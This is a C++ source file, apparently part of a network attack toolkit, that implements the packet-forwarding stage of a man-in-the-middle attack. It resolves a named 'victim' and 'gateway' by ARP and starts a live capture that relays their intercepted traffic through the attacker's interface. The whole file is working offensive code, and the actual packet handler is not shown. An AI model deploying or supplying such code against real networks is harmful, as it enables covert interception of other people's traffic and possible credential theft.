//
// Created by dev on 6/28/25.
//

#include "mitm-packet-forwarding.hpp"

void ashk::tasks::MITMPacketForwarding::exec() {
    logger.log("start forwarding . . .\n");
    dev_ = pcpp::PcapLiveDeviceList::getInstance().getDeviceByIp(iface_ip);
    if (dev_ == nullptr) {
        logger.log("couldn't find device\n");
        return;
    }
    if (!dev_->open()) {
        logger.log("couldn't open device");

    }
    pcpp::MacAddress iface_mac = dev_->getMacAddress();
    pcpp::MacAddress victim_mac;
    pcpp::MacAddress gateway_mac;
    if (victim == iface_ip) {
        victim_mac = iface_mac;
    } else {
        victim_mac = NetUtils::arp(victim,dev_);
        if (victim_mac == pcpp::MacAddress::Zero) {
            logger.log("didnt receive arp reply from " + victim.toString() + "\n");
            return;
        }
    }
    if (gateway == iface_ip) {
        gateway_mac = iface_mac;
    } else {
        gateway_mac = NetUtils::arp(gateway,dev_);
        if (gateway_mac == pcpp::MacAddress::Zero) {
            logger.log("didnt receive arp reply from " + gateway.toString() + "\n");
            return;
        }
    }

    MITMForwardingCookie cookie;
    cookie.gateway_ip=gateway;
    cookie.victim_ip=victim;
    cookie.victim_mac=victim_mac;
    cookie.gateway_mac=gateway_mac;

    if (!capture_wrapper.start_capture(dev_, PacketReceiver::onPacketArrivesMITMForwarding, &cookie,last_task_id))
        return;
    while (is_running()) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    capture_wrapper.stop_capture(dev_);
    logger.log("mitm forwarding stopped.\n");
}
ashk::tasks::MITMPacketForwarding::MITMPacketForwarding(pcpp::IPv4Address iface_ip, pcpp::IPv4Address victim,
                                                        pcpp::IPv4Address gateway,
                                                        int last_task_id) : iface_ip(iface_ip),victim(victim),
                                                        gateway(gateway),last_task_id(last_task_id) {

}
